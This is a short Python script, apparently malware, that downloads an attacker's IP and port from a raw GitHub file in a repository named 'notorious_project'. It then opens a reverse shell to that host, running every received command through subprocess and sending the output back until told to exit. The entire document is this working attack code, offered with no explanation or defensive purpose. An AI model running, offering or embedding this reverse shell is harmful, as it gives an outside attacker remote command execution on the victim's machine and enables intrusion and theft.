url = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/host"
res = requests.get(url)
lines = res.text.strip().split("\n")
ip = lines[0]
port = int(lines[1])

def reverse_shell(host, port):
    s = socket.socket()
    s.connect((host, port))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    s.close()

reverse_shell(ip, port)
